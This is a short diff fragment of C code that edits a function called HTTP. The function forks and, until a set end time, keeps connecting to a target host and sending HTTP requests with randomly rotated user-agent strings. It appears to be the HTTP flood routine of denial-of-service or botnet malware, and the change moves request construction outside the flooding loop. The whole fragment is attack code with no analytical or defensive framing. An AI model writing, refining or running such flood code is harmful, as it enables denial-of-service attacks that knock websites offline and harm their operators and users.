@@ -11,10 +11,9 @@ void HTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int
 	{
 		if (fork())
 		{
-			
+			sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: Keep-Alive\r\n\r\n", method, path, host, useragents[(rand() % 36)]);
 			while (end > time(NULL))
 			{
-				sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: Keep-Alive\r\n\r\n", method, path, host, useragents[(rand() % 36)]);
 				socket = socket_connect(host, port);
 				if (socket != 0)
 				{
